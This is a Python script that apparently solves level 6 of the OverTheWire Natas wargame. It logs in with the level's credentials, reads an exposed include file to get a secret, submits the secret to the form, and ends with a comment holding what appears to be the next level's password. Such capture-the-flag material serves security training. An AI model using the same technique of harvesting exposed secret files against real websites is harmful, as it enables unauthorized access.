import requests
import re

url= "http://natas6.natas.labs.overthewire.org"

s= requests.Session()
s.auth=('natas6','aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1')
r= s.get(url+'/includes/secret.inc')
tmp= (str(r.text).split('"'))[1]

headers ={
    'Content-Type': 'application/x-www-form-urlencoded'
}
secret = f'secret={tmp}&submit=Submit'

r= s.post(url, headers= headers, data= secret)
print(r.text)

#7z3hEENjQtflzgnT29q7wAvMNfZdh0i9